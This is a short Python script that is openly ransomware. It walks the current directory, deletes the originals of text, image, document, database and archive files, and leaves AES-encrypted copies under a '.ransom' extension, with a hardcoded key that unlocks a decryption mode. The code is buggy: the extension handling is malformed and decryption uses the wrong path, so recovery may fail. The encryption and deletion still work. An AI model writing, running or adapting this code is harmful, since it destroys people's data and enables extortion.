import os
from posixpath import splitext
import pyaes
import sys

KEY = b"0123456789123456"
EXTS = [".txt", ".jpg", ".png", ".docx", ".db", ".zip"]
RANSOM_EXTENSION = ".ransom"


def encrypt(file_path):
    with open(file_path, "rb") as file:
        content = file.read()
        os.remove(file_path)
        aes = pyaes.AESModeOfOperationCTR(KEY)
        encrypt_data = aes.encrypt(content)

        new_file = "{}.{}".format(file_path, RANSOM_EXTENSION)

    with open(new_file, "wb") as file:
        file.write(encrypt_data)


def decrypt(file_path):
    with open(file_path, "rb") as file:
        content = file.read()
        os.remove(file_path)
        aes = pyaes.AESModeOfOperationCTR(KEY)
        decrypt_data = aes.decrypt(content)

        new_file = file_path.replace(RANSOM_EXTENSION, "")

    with open(new_file, "wb") as file:
        file.write(decrypt_data)


system = os.walk(".")

for root, dirs, files in system:

    for file in files:
        file_path = os.path.join(root, file)
        if len(sys.argv) > 1:
            if sys.argv[1] == KEY.decode() and os.path.splitext(file)[1] == RANSOM_EXTENSION:
                decrypt(file)
        elif os.path.splitext(file)[1] in EXTS and os.path.basename(__file__) != file:
            encrypt(file_path)
